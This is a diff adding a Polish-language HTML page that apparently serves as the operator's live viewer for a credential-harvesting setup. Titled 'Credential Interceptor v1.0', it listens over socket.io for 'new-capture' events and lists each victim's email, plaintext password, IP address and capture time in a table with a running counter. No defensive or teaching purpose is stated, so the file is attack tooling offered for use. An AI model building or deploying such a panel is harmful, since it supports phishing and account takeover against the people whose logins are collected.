@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <link href="./output.css" rel="stylesheet">
+    <script src="/socket.io/socket.io.js"></script>
+    <title>Hacker Dashboard | Live Capture</title>
+</head>
+<body class="bg-slate-900 text-green-400 font-mono p-8">
+    <div class="max-w-5xl mx-auto">
+        <div class="flex justify-between items-end border-b border-green-900 pb-4 mb-8">
+            <div>
+                <h1 class="text-3xl font-bold uppercase tracking-tighter">Credential Interceptor v1.0</h1>
+                <p class="text-xs text-green-700">Status: Monitoring incoming packets...</p>
+            </div>
+            <div id="counter" class="text-4xl font-black">00</div>
+        </div>
+
+        <div class="overflow-hidden rounded-xl border border-green-900 bg-black/50">
+            <table class="w-full text-left">
+                <thead class="bg-green-900/20 text-green-500 uppercase text-xs">
+                    <tr>
+                        <th class="p-4">Godzina</th>
+                        <th class="p-4">Użytkownik (Login)</th>
+                        <th class="p-4">Hasło</th>
+                        <th class="p-4">IP</th>
+                    </tr>
+                </thead>
+                <tbody id="logs">
+                    </tbody>
+            </table>
+        </div>
+    </div>
+
+    <script>
+        const socket = io();
+        let count = 0;
+        socket.on('new-capture', (data) => {
+            count++;
+            document.getElementById('counter').innerText = count.toString().padStart(2, '0');
+            const row = `<tr class="border-b border-green-900/30 animate-pulse bg-green-900/5">
+                <td class="p-4 text-xs">${data.time}</td>
+                <td class="p-4 font-bold text-white">${data.email}</td>
+                <td class="p-4 text-red-400 font-bold">${data.password}</td>
+                <td class="p-4 text-xs opacity-50">${data.ip}</td>
+            </tr>`;
+            document.getElementById('logs').insertAdjacentHTML('afterbegin', row);
+        });
+        socket.on('clear-dashboard', () => { location.reload(); });
+    </script>
+</body>
+</html>
